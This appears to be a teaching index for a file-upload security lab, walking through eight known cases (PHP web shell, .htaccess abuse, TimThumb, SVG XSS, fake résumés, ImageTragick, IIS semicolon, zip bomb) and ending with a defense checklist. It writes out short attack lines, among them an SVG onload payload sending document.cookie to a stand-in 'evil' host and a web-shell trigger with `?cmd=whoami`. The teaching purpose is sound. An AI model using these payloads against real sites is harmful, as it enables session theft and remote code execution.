# File upload — famous cases (links + illustrations)

Each case has a PNG in [`illustrations/`](illustrations/). Case **#1** uses **two** slides (no MITM — only the attacker).

---

## 1. Upload `image.php` + spoofed headers → RCE (web shell)

| | |
|---|---|
| **Lekko technicznie** | [`illustrations/hist-01-php-shell-light.png`](illustrations/hist-01-php-shell-light.png) |
| **Skrajnie technicznie** | [`illustrations/hist-01-php-shell-technical.png`](illustrations/hist-01-php-shell-technical.png) (1920×1080) · [**720p**](illustrations/hist-01-php-shell-technical-720p.png) (1280×720) |
| **Obejścia rozszerzeń (opcjonalnie)** | [`hist-01-why-jpg-vs-php.png`](illustrations/hist-01-why-jpg-vs-php.png) |
| **PortSwigger — File uploads (theory + web shell)** | https://portswigger.net/web-security/file-upload |
| **Lab: RCE via web shell** | https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload |
| **Lab: blocklist + `.htaccess`** | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass |
| **OWASP — Unrestricted File Upload** | https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload |
| **ZeroExp — disable execution in upload dirs** | https://zeroexp.dev/library/prevent-upload-execution |

**Story (correct model — no Burp, no victim):**

1. **Attacker** uploads a file whose body is **`GIF89a;` + PHP shell**, multipart part labeled **`Content-Type: image/jpeg`**, **`filename="image.php"`**.
2. **Weak backend** accepts the upload (header and/or weak magic-byte check) and writes **`/uploads/image.php`** unchanged.
3. Attacker calls **`GET /uploads/image.php?cmd=…`** → web server runs **`.php`** via **`mod_php`** → interpreter hits **`<?php … ?>`** in the file → **RCE** (leading `GIF89a` is irrelevant to that step).

**Impact:**
   - Read secrets from disk (config, keys, `secret` files)
   - Dump or copy the **database** (customers, passwords hashes, orders)
   - **Change the shop** (defacement, scam page, malware for visitors)
   - **Pivot** — use your server to attack others (spam, bots, mining)

**Technical slide (story, English):** [`hist-01-php-shell-technical-720p.png`](illustrations/hist-01-php-shell-technical-720p.png) — title **Unrestricted file upload → web shell (CWE-434)**. Three separate cards: (1) user uploads `image.php` as `image/jpeg` with `GIF89a;` + PHP body, (2) server stores `/uploads/image.php`, (3) user GETs `?cmd=whoami` and `mod_php` runs it.

**HTTP (what the slide shows):**

| Layer | Header / line | Meaning |
|--------|----------------|---------|
| Request | `Content-Type: multipart/form-data; boundary=…` | Normal browser upload |
| Part | `Content-Disposition: … filename="image.php"` | **Real** name on disk if the app is naive |
| Part | `Content-Type: image/jpeg` | Declares “this part is JPEG” — a dumb app may **only** look here |
| Part body | `GIF89a;` then `<?php … ?>` | Bytes saved **as-is** into `uploads/image.php` |

**Why execution does not care about `GIF89a` at the start**

1. **On upload**, `GIF89a` is optional. It exists to fool checks that read **only the first few bytes** (“magic number”) or trust the part’s `Content-Type: image/jpeg`. It is **not** what makes PHP run later.
2. **On `GET`**, Apache (typical lab stack) maps **`*.php`** to the PHP engine (**`mod_php`**). That decision uses the **URL path / file extension**, not “does this look like JPEG?”.
3. **Inside the file**, PHP does **not** require `<?php` at byte 0. The interpreter scans the file and **executes any `<?php … ?>` block**. Bytes before that (`GIF89a;`) are outside PHP tags — they may be echoed as output, but the shell still runs.

**Saved as (weak backend):** `uploads/image.php` from `filename="image.php"` in Content-Disposition.

**Trigger:** `GET /uploads/image.php?cmd=whoami` → handler for `.php` → `system('whoami')` → RCE.

**Real history (important):** This is **not** a single newspaper headline like TimThumb 2011 — it is the **default failure mode** of **PHP + Apache shared hosting** from the **2000s–2010s** until today on misconfigured sites. Pentesters and criminals repeatedly found: avatar/CV/gallery upload → file saved under the web root → **mod_php runs `.php`**. [PortSwigger Web Security Academy](https://portswigger.net/web-security/file-upload) built its **RCE upload labs** on this exact chain (e.g. reading `/home/carlos/secret`). Classified under **CWE-434** / OWASP “Unrestricted File Upload”. Your **Node shop lab** intentionally does **not** execute uploads — this case explains **server-side** impact when the stack **does** run PHP.

---

## 2. Uploading `.htaccess` → a new “executable” extension

| | |
|---|---|
| **Illustration** | [`illustrations/hist-02-htaccess-story-720p.png`](illustrations/hist-02-htaccess-story-720p.png) — **.htaccess upload → new PHP extension (CWE-434)** |
| **PortSwigger lab (step-by-step)** | https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass |
| **OWASP Cheat Sheet — `.htaccess` in uploads** | https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html |
| **Cyber Library — `.htaccess` override abuse** | https://www.cyberlibrary.com/en/docs/offensive/software/applications/server/web/platform/apache/handler-and-type-mapping |
| **GitHub Advisory (Vvveb CMS, real chain)** | https://github.com/givanz/Vvveb/security/advisories/GHSA-qpcx-gx2x-r8v2 |

**Plain language:** A tiny config file in the upload folder changes the rules so the next upload runs like a program.

**Technical:** Upload `.htaccess` with `AddType application/x-httpd-php .l33t` → upload `exploit.l33t` → Apache executes it as PHP.

---

## 3. TimThumb (WordPress ecosystem, 2011)

| | |
|---|---|
| **Illustration** | [`illustrations/hist-03-timthumb-story-720p.png`](illustrations/hist-03-timthumb-story-720p.png) — **TimThumb 2011 → RCE on WordPress (CVE-2011-4106)** |
| **CVE-2011-4106 (NVD)** | https://nvd.nist.gov/vuln/detail/CVE-2011-4106 |
| **Mark Maunder — technical write-up** | https://markmaunder.com/2011/technical-details-and-scripts-of-the-wordpress-timthumb-php-hack/ |
| **TimThumb 2.0 announcement** | https://www.binarymoon.co.uk/2011/08/timthumb-2/ |
| **Wordfence — TimThumb ≤ 1.33** | https://www.wordfence.com/threat-intel/vulnerabilities/detail/timthumb-133-remote-file-download |

**Plain language:** In 2011 a WordPress thumbnail script (`thumb.php` / `timthumb.php` in a theme or plugin) fetched a file that only looked like an image URL. It saved that file in `cache/`. Opening the cached PHP ran a web shell on the blog.

**Technical:** CVE-2011-4106. Request `/wp-content/plugins/…/timthumb.php?src=http://allowed.com.evil/x.php`. The domain allow-list matched a prefix, so TimThumb wrote `x.php` into `cache/`. `GET …/cache/x.php` executed it.

---

## 4. Stored XSS via SVG upload

| | |
|---|---|
| **Illustration** | [`illustrations/hist-04-svg-xss-story-720p.png`](illustrations/hist-04-svg-xss-story-720p.png) — **SVG avatar upload → stored XSS (CWE-79)** · bio stays plain text; the user only attaches `avatar.svg` |
| **PortSwigger — client-side scripts (SVG/HTML uploads)** | https://portswigger.net/web-security/file-upload |
| **PacketWanderer — Stored XSS via SVG** | https://packetwanderer.com/posts/svg-xss/ |
| **TypiCMS advisory** | https://github.com/TypiCMS/Core/security/advisories/GHSA-xfvg-8v67-j7wp |
| **ComfyUI advisory (`/view` + inline SVG)** | https://github.com/Comfy-Org/ComfyUI/security/advisories/GHSA-rj8c-c4p8-3c5h |
| **OopsSec — MIME vs bytes + CSP** | https://koadt.github.io/oss-oopssec-store/posts/malicious-file-upload-stored-xss/ |

**Plain language:** On a profile, the bio stays ordinary text. The user only attaches an avatar. That file is an SVG. When someone opens the profile, the script inside the avatar runs and can steal the login session.

**Technical:** The attached file is `image/svg+xml`. Its body is `<svg onload="new Image().src='//evil/?c='+document.cookie">`. The server stores `/uploads/avatar.svg` and serves it on the same origin, so opening the profile sends the session cookie. An `<img>` tag often does **not** run that script.

---

## 5. Fake “resume” for HR — malware, not a CV

*(Mostly **phishing + file delivery**, not a classic “broken upload” on the app server — but it illustrates **malware hosting on a trusted name**.)*

| | |
|---|---|
| **Illustration** | [`illustrations/hist-05-fake-resume-story-720p.png`](illustrations/hist-05-fake-resume-story-720p.png) — **Fake résumé ZIP → workstation malware** |
| **Arctic Wolf — Venom Spider / More_eggs** | https://arcticwolf.com/resources/blog/venom-spider-uses-server-side-polymorphism-to-weave-a-web-around-victims/ |
| **CSO Online** | https://www.csoonline.com/article/3977803/fake-resumes-targeting-hr-managers-now-come-with-updated-backdoor.html |
| **The Hacker News (2024)** | https://thehackernews.com/2024/10/fake-job-applications-deliver-dangerous.html |
| **eSentire — LinkedIn lure** | https://www.esentire.com/blog/more-eggs-activity-persists-via-fake-job-applicant-lures |

**Plain language:** A recruiter downloads a “CV”; the zip holds a Windows shortcut, not a PDF — the workstation is infected.

**Technical:** More_eggs campaigns — fake CV site, CAPTCHA, ZIP with malicious `.lnk` and a multi-stage backdoor.

---

## 6. ImageTragick (ImageMagick, 2016)

| | |
|---|---|
| **Illustration** | [`illustrations/hist-06-imagetragick-story-720p.png`](illustrations/hist-06-imagetragick-story-720p.png) — **ImageTragick → command injection (CVE-2016-3714)** |
| **imagetragick.com** | https://imagetragick.com/ |
| **CVE-2016-3714 (NVD)** | https://nvd.nist.gov/vuln/detail/CVE-2016-3714 |
| **CERT VU#250519** | https://kb.cert.org/vuls/id/250519 |
| **Cloudflare — payloads in the wild** | https://blog.cloudflare.com/inside-imagetragick-the-real-payloads-being-used-to-hack-websites-2/ |
| **PoCs (GitHub)** | https://github.com/ImageTragick/PoCs |

**Plain language:** A user uploads a profile photo; when the server resizes it, hidden commands run and the attacker gains shell access.

**Technical:** CVE-2016-3714 — ImageMagick “delegate” / shell injection when processing crafted SVG/MVG; mitigate with updates, magic-byte checks, and `policy.xml`.

---

## 7. IIS — `evil.asp;.jpg`

| | |
|---|---|
| **Illustration** | [`illustrations/hist-07-iis-semicolon-story-720p.png`](illustrations/hist-07-iis-semicolon-story-720p.png) — **IIS semicolon → script hidden as .jpg (CVE-2009-4444)** |
| **CVE-2009-4444 (NVD)** | https://nvd.nist.gov/vuln/detail/CVE-2009-4444 |
| **Rapid7 — Metasploit + JPG header** | https://old.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/ |
| **OWASP — bypass list (IIS semicolon, double ext.)** | https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload |
| **PortSwigger — double extensions** | https://portswigger.net/web-security/file-upload |

**Plain language:** The filename looks like `.jpg`, but legacy IIS treats part of the name differently and runs it as a server script.

**Technical:** CVE-2009-4444 — IIS uses the extension **before** `;`; the upload filter only checks `.jpg`. Story slide: [`hist-07-iis-semicolon-story-720p.png`](illustrations/hist-07-iis-semicolon-story-720p.png).

---

## 8. Zip bomb upload → application DoS (CWE-409)

| | |
|---|---|
| **Illustration** | [`illustrations/hist-dos-zipbomb-story-720p.png`](illustrations/hist-dos-zipbomb-story-720p.png) — **Zip bomb upload → application DoS** |
| **Lab exercise** | [`FileUpload/README.md`](../../README.md) — exercise 5 |
| **CWE-409** | https://cwe.mitre.org/data/definitions/409.html |
| **42.zip (classic demo)** | https://www.unforgettable.dk/ |

**Plain language:** The file looks tiny. The shop already has a MAX-bytes check. Then the server unpacks the zip to “preview” it, RAM fills up, and other members cannot use the shop.

**Technical:** Multipart body is `bomb.zip` (~40 KB). `UPLOAD_MAX_BYTES` (2 MB) passes. A naive `inflate` of the first entry follows the ZIP header’s uncompressed size (100 MiB in the lab; gigabytes in a real bomb). That is **application-layer DoS**, not a network flood. The lab caps inflate at 8 MiB so the VM survives.

**Story (English):** [`hist-dos-zipbomb-story-720p.png`](illustrations/hist-dos-zipbomb-story-720p.png) — three cards: (1) user uploads `bomb.zip` · 42 KB, (2) server unpacks it because the limit was only MAX bytes, (3) the shop stalls.

---

## Defense checklist — filter out malicious files

| | |
|---|---|
| **Illustration** | [`illustrations/hist-defense-filter-malicious-files-720p.png`](illustrations/hist-defense-filter-malicious-files-720p.png) (1280×720) |

1. Only allowed extensions. Do not trust Content-Type.
2. File not bigger than MAX bytes.
3. Trust only authorized users.
4. Store files on a dedicated server.
5. Run the file through an antivirus / a sandbox.
6. Protect the file upload against CSRF.

---

## File order

```
illustrations/hist-01-php-shell-technical-720p.png
illustrations/hist-02-htaccess-story-720p.png
illustrations/hist-03-timthumb-story-720p.png
illustrations/hist-04-svg-xss-story-720p.png
illustrations/hist-05-fake-resume-story-720p.png
illustrations/hist-06-imagetragick-story-720p.png
illustrations/hist-07-iis-semicolon-story-720p.png
illustrations/hist-dos-zipbomb-story-720p.png
illustrations/hist-defense-filter-malicious-files-720p.png
```

Each story slide is **1280×720**, English, three cards (upload → what the server does → what happens next), same watercolor deck as case 1. A 1920×1080 copy sits beside each file without the `-720p` suffix.

On-image text is AI-generated — proofread before printing or projecting.